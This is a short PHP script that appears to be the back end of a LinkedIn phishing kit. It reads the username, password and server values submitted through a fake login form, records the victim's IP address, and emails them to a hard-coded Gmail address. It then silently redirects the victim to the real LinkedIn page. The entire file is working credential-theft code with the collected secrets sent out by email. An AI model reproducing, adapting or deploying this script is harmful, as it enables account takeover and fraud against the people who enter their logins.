<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$UserN = $_POST['session_key'];
$UPass = $_POST['session_password'];
$Userv = $_POST['server'];
$ata="jerrylee339@gmail.com";


  $subj = "($UPass)";
  $msg = "Details of https://www.linkedin.com/\n\nUserName: $UserN\Password: $UPass\nServer $Userv\n\nUsername: $UserN  \n\nSubjuct: $sub\n\nSubmitted from IP Address - $ip on $adddate\n----------------------------";
  $from = "From: jex.es<$UserN@jex.es >";
  mail("$ata", $subj, $msg, $from);
  
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://www.linkedin.com/\">");
exit();

?>